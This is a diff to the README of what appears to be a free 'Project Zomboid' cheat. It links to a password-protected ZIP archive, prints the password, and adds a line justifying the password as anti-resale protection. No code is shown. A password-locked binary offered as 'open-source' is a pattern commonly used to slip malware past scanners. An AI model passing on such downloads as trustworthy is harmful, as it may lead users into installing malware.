@@ -2,6 +2,7 @@
 
 [**Download**](https://github.com/ayhantunay/Project-Zomboid-Cheat/releases/download/pzcheat/PZBuildReleased.zip) [this cheat is completely free, if you see that it is being sold somewhere, there contact us below]
 # [ 🔑 ] Password for archive: Released
+# Ask why the archive is password protected.  - This was done so that there would be no distribution under the guise of your own for further sale. The cheat is absolutely free
 
 This open-source Project Zomboid modification, coded in Java (API) and Lua (GUI), enhances gameplay with added features. Users are cautioned to use responsibly, understanding the risks involved. Compatibility is confirmed with Project Zomboid version 41.78.16 (Steam) as of July 5th, 2023. 🏆
 
